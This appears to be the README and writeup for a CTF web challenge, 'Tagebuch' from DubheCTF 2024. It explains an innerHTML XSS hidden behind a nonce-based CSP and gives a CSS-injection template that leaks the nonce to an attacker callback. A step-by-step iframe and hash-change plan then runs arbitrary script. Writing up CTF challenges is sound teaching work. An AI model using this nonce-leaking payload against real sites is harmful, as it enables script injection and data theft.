# Tagebuch

A simple diary-sharing site, but vulnerable. (DubheCTF 2024)

## 题面

白盒前端题，题目附件为本仓库。

### 题目描述

> Ich habe eine Tagebuch-Website von jemand anderem kopiert, wie könnte das ein Problem sein?

## Writeup

> [!TIP]
> 本题出题参考了 [0CTF/TCTF 2023 newdiary](https://blog.huli.tw/2023/12/11/en/0ctf-2023-writeup/#web-newdiary-14-solves) 和 [ASISCTF 2021 Lovely Nonce](https://ctftime.org/writeup/31077)

题目整体的攻击流程图（感谢 V&N 的 [@Cnily03](https://github.com/Cnily03) 师傅做的图）：

![图片](https://github.com/mix-archive/Tagebuch/assets/32300164/b1400d89-6208-4502-8745-83fecf6e69eb)

阅读源码，发现日志的查看和分享功能使用了`innerHTML`，存在 XSS 漏洞。但是由于 CSP 的限制，无法直接执行没有`nonce`的脚本。

```javascript
const param = new URLSearchParams(location.hash.slice(1));
const id = param.get('id');
if (id && /^[0-9a-f]+$/.test(id)) {
  fetch(`/read/${id}`)
    .then((data) => data.json())
    .then((data) => {
      const title = document.createElement('p');
      title.innerText = data.title;
      document.getElementById('title').appendChild(title);

      const content = document.createElement('p');
      content.innerHTML = data.content;
      document.getElementById('content').appendChild(content);
    });
  document.getElementById('share').href = `/share_diary/${id}`;
}
```

```typescript
app.engine('html', async (path, data, cb) =>
  ejs.renderFile(path, data, (err, html) => {
    if (err) return cb(err);
    const nonce = nonceStorage.getStore();
    if (nonce) {
      const cspMeta = `<meta http-equiv="Content-Security-Policy" content="script-src 'nonce-${nonce}';">`;
      html = html.replace(/<head>/, `<head>\n${cspMeta}`);
    }
    cb(null, html);
  })
);
```

因为 CSP 并没有限制 CSS，所以我们可以通过 CSS 注入来获取到 nonce ，然后再利用 nonce 来执行脚本。

```css
script {
  display: block;
}
script[nonce^='{{:token:}}'] {
  background-image: url('{{:callback:}}');
}
```

同时由于 [share_read.js](./frontend/static/js/share_read.js) 中 `window.addEventListener("hashchange", load);` 的存在，我们可以通过修改 URL Hash 的方式来变更上传日志的 ID，但是不刷新页面，从而使 nonce 不变。

所以我们可以建立如下的攻击思路：

1. 使用 `<meta http-equiv="refresh" content="1; https://example.com">` 跳转到自己构造的页面

2. 在自己的页面中，构造一个 Iframe，将 src 指向分享的页面。同时构造一个 CSS，包含对 nonce 前缀的选择器，将其 background-image 指向自己的服务器。

3. 在获得 nonce 前缀后，构造一个新的 CSS，包含已知 nonce 前缀的选择器，更新 Iframe URL 中的 Hash 部分以在不刷新页面的情况下获取新的 nonce。

4. 重复第 2、3 步，直到获得完整的 nonce。

5. 使用完整的 nonce，便可以通过`<iframe srcdoc>`来执行任意 JavaScript 代码，从而获取 Flag。

本题目的完整攻击脚本见 [exp.py](./exploit/exp.py)
